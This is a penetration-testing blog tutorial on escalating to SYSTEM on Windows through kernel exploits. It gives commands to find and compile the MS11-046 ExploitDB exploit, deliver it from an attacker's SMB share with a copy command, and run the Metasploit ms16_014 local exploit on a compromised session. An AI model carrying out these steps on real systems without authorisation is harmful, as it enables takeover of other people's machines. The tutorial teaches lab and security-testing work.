<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Privilege Escalation: Kernel Exploit</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-kernel-exploit/" rel="bookmark"><time class="entry-date published" datetime="2021-12-30T17:41:33+00:00">December 30, 2021</time><time class="updated" datetime="2025-05-10T20:27:50+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">As this series was dedicated to Windows Privilege escalation thus I’m writing this Post to explain command practice for kernel-mode exploitation.</span></p>
<h3><span style="color: #800000;">Table of Content </span></h3>
<ul>
<li><strong><span style="color: #000000;">What is a kernel?</span></strong></li>
<li><strong><span style="color: #000000;">Prerequisite</span></strong></li>
<li><strong><span style="color: #000000;">Hunting Vulnerable Kernel</span></strong></li>
<li><strong><span style="color: #000000;">Kernel Privilege Escalation Techniques</span></strong>
<ul>
<li><strong><span style="color: #000000;">Kernel Exploit Using Metasploit</span></strong></li>
<li><strong><span style="color: #000000;">Kernel Exploit Using ExploitDB</span></strong></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;"> What is a kernel?</span></h3>
<p><span style="color: #000000;">A kernel is a computer program that serves as the core or heart of an operating system. It manages memory management, task management, and disk management. </span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEix9hTM4mtWUYo0KUkMoIiFt85eu56QVadym5SAsD7cbaoGoAJYev93R12FoYCnVeY8Tq2X3sQCfBhjTqjHCQ9orMMDhXi8a_7s_UByw2PfcM7inB3_fSkP-DybHn9x1mRt0d4TFykM9iJ_dMhtmpqyVkXMT3sq3RdpTBdapYwRmpa_AcR2tHHYHmSeJg=s16000"/></p>
<p><span style="color: #000000;"><strong>An operating system has the following separated spaces:</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Kernel Space:</strong> A kernel is typically maintained and loaded into a distinct memory region referred to as protected Kernel space. It is secured against access by application programs or less critical components of the operating system.</span></li>
<li><span style="color: #000000;"><strong>User Space:</strong> The operating system (OS) is the software that acts as a bridge between hardware components and the end-user. User-space memory is used by application programs such as a browser, word processor, and audio and video player.</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Kernel Privilege Escalation Techniques</strong></span></h3>
<p><span style="color: #000000;">A privilege escalation vulnerability exists in the Windows kernel on the remote host. If exploited successfully, a locally authorized attacker might execute a specially built kernel-mode program and take control of the machine.<strong><br/>
Tactics:  </strong>Privilege Escalation</span></p>
<p><span style="color: #000000;"><strong>Platforms:</strong> Windows</span></p>
<h3><span style="color: #800000;">Prerequisite</span></h3>
<p><span style="color: #000000;"><strong>Target Machine:</strong> Windows 10</span></p>
<p><span style="color: #000000;"><strong>Attacker Machine:</strong> Kali Linux</span></p>
<p><span style="color: #000000;"><strong>Condition:</strong> Compromise the target machine with low privilege access either using Metasploit or Netcat, etc.</span></p>
<p><span style="color: #000000;"><strong>Objective:</strong> Escalate the NT Authority /SYSTEM privileges for a low privileged user by exploiting the kernel.</span></p>
<h3><span style="color: #800000;">Hunting Vulnerable Kernel</span></h3>
<p><span style="color: #000000;">An attacker will always look for privilege escalation if enumerate vulnerable kernel is built. This could possible by injecting python or PowerShell script. It enumerates based on build number and can return the CVE ID to easily exploit the machine and get Administrator. Access.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjImmLYsfjpdiZiRfDRbUd9AZNeqtveV_SN33uYymwfy81GRKfexHHEH-kBw9VAVTNYaptDLt2Hc9a1XTYihZF8uPSoaftSXYtFnn76GorWzmDZD5MLl8scm6fH5ktj5zprKBRFjV-V7PqvlbN7al7SAwvwm0cO3UF6BsSbHjd0KU6O8wpdUQZRhJRPJw=s16000"/></span></p>
<p><span style="color: #000000;">Read more about this from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/window-privilege-escalation-automated-script/">Window-Privilege-Escalation-Automated-Script</a></strong></span></span></p>
<h3><span style="color: #800000;">Kernel Exploit Using ExploitDB</span></h3>
<p><span style="color: #000000;">Once the attacker has a reverse connection, he may enumerate kernel built as highlighted in the below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj-FGycZZM0K9lX7x4E5pBhOycEJnsKkF23zdTdQMBaKc2SRpYQYbwEUmvplhpbunLXL7ce0NTlqqYS4m0aN8Cc0b3wVQJNIhyW0-snw5qPkWFUsUfi15wYdYlmeLCT1FKwZlJzaI3VEdlH15FBIFyTeOQrS6IfeDSz5pDIJtK9-aLqv2TjY0Kt950tsQ=s16000"/></span></p>
<p><span style="color: #000000;">This will help him to find out a related exploit if it is vulnerable.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiMstI07xOL33e4IFw9iVAw_TgQwZpz3Oigv9CZxLuMHn57dfvoH7J2O9ntX5sfOY_RA8Ep48d8UQd7hHaN9YqZQubxdKULd-S3plx1XC34XYGS3rhajJQWAHN1LBavsOr-jKpiVxaPlUI4Vtng6m6GwfSFE1WjGNmhtWTigJrOdxf9gSMVCiifpY7IRQ=s16000"/></span></p>
<p><span style="color: #000000;">For the related kernel version, we found it was vulnerable from MS11-046 (CVE: 2011-1249).</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjmfZTwywq-Rimn59ptkELXOYA7Ysx9QKxV6iTnqELDYfRQaDDWA3tk60q6rKdVFVNAK_ViHaWsbnMSSsuWj3lKu0IaQ7k17SS5IHyuNAm-GRY2ILvDxqvnAD6CT05XvNtSzEFCYJdkBRv2DiilW24MUbEP-SpG4hmipMcPtBy33mJfMLTvtVkST0DpaA=s16000"/></span></p>
<p><span style="color: #000000;">The same may be enumerated using searchsploit, which is also considered an offline version of ExploitDB. As illustrated below, we can download the same exploit from its offline version.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit 40564
i686-w64-mingw32-gcc 40564.c –o 40564.exe –lws2_32</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEii2C--rJ7P3WeTTOZE7ZfEXmiXPGAhcnxvsFOSd67tPIpW2vf77G7W89xy9WhEGbljzElTJ-40h4BOFINTUedhIg_PsLB5tI7o3xTcdTRuaBr-Ja9_Zyk6ocZkqSrvmHp5t9uKgsAmGxRDOxQHfLvv83TYK07N5cPCQ1ecIPP-2z67KbZdlJYiFlpIgQ=s16000"/></span></p>
<p><span style="color: #000000;">Let’s start SMB Share service in a new terminal with the help of impacket python script as given below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver share $(pwd)</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgap-13MCS0MgXLqXScjFaGhgOAwMlN1e-OHZE7evHcPeKQSN8pPmCwPF5rJFYY_1zn0dMaLX0tG5AZ1NlDiRbQuCIMh8mjWmv8tb1ROV9LklZc-xvH-cE5IMV4rhpIc_YV9iW_cecgXY5ARb22IYmRkTC6XXN7fX9uDQJOxwD2XITnnawWha5wCjFeuw=s16000"/></span></p>
<p><span style="color: #000000;">This will help us to import exploit inside compromised shells with the help of the copy command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">copy \\192.168.1.3\share\40564.exe</pre>
<p><span style="color: #000000;">Once the exploit will be downloaded we can execute this program to obtain a privilege shell as <strong>NT Authority/system.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEie-NupCAkj6rPafQfqP8nmIpXEdZS47R7KEA5iAd6DUYiCasDjJQJrKfNdPfgpazTnv-FuwefgMtKHAIEtwYWslFeWFpyaeAOV3qXe5Lr-vLTv1D-vfkXr-1dI0OaDTbfiPn39dqI4MIxzabVErIdp230MMc9MPmIVupZ0vPq5x3VL9vChZgV3j_zWGw=s16000"/></span></p>
<h3><span style="color: #800000;">Kernel Exploit Using Metasploit</span></h3>
<p><span style="color: #000000;">Once you have enumerated kernel built you can use Google to get available exploit whereas you can download Windows Exploit Suggester – Next Generation (WES-NG) in your kali Linux that will hunt available exploit for vulnerable kernel built. You can download this script from the Github library.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/bitsadmin/wesng
cd wesng</pre>
<p><span style="color: #000000;"><strong>Note:</strong> There are two options to check for missing patches: a. Launch missingkbs.vbs on the host to have Windows determine which patches are missing b. Use Windows’ built-in systeminfo.exe tool to obtain the system information of the local system, or from a remote system using systeminfo /S MyRemoteHost, and redirect this to a file: <strong>systeminfo &gt; systeminfo.txt</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh3F67_f6OnudxHWRjZ2GHZXqFtM_ArfbZ_QrtLglQr5R088A9418To9VoOZaKLiSCco1H5qXIcDWXzBpSUdNzXxLGDWOeSEvmhUSQSklNehkjcnr_WHgkm9eX85cUy97sV7S-3RZu9msgl0r30tCc2NicjjEaKPUPB-8yjPL1Y88L0-dSz3wfQlUBjaQ=s16000"/></span></p>
<p><span style="color: #000000;">Since we have saved the output systeminfo in a text file and named it systeminfo.txt. Further, we used this information for running the <strong>wes.py</strong> script</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python wes.py /root/systeminfo.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjNzqqTguvArDSTqtwo7NE30zrxjf78rIaX_GFLaBAjXWLVkTnhGfdgeu20p0lxgHVw3m77tUpRlZiK3kvAWsb4hc43JdBOQG-Td1AALgE-rTNBrGVaRwxwYK-R2HaVlAaBgVb_8y1hHGpAvWQKu9kdljGPO9UeHW0eS_e09iefnvqN9AbeRTtyBwqraA=s16000"/></span></p>
<p><span style="color: #000000;">As result, it will try to determine missing patches and report available vulnerability and Risk Impact. From the given below image, you can observe it has a pointed link for exploit available on exploit db.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEidinyp5Cvk7pzq0D_PFT1VMimYUqFRj8WANgDK7990ZKmCZBrS4wpFBDZ6sJAFToExfYoCJk75cKBJH1zJj8Bgeu9_UB5XrO-Wk0WWutN8cdfp9HAx5Juj7XNOomGMmGRLwzs8AELyqRRLuGj66JIoVvsvUMuM2CkED3Y5GlM1r0-yQYtU_N2Vg54AZQ=s16000"/></span></p>
<p><span style="color: #000000;">This time we will use Metasploit for post-exploitation and look for privilege shell with NT Authority Privileges.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms16_014_wmi_rec_notif
set session 1
exploit</pre>
<p><span style="color: #000000;">On successful execution, it will give shell for Administrative Privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiFVyT8YVsRNNLdC-gZ1e7mzdCWAJcxeu17VNxKpTiKn8TGwSnW9thk_mSDiQJNu038RmMVGMgeAfXI5n582tjIykKkAmLINeL24_eym3YvcG9ql-EpaOc-URW3MFfOfzJdRQUzEdGPGpWCQ6RtcmO76lq9UF9hjAk85S6KC7bOAcPzWMtNw9piraXK9A=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><strong><a href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
